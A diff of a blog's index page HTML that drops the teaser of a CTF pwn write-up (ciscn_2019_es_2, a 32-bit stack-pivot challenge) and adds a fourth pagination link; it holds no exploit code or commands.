-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>32位，看看函数主体<br><img src="https://img-blog.csdnimg.cn/20210216115729554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>read函数0x30只能刚好覆盖ebp和ret。所以我们要用到栈迁移
-        
-          <a class="article-more-a" href="/2021/02/20/ciscn_2019_es_2%E7%9A%84wp/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/02/20/ciscn_2019_es_2%E7%9A%84wp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
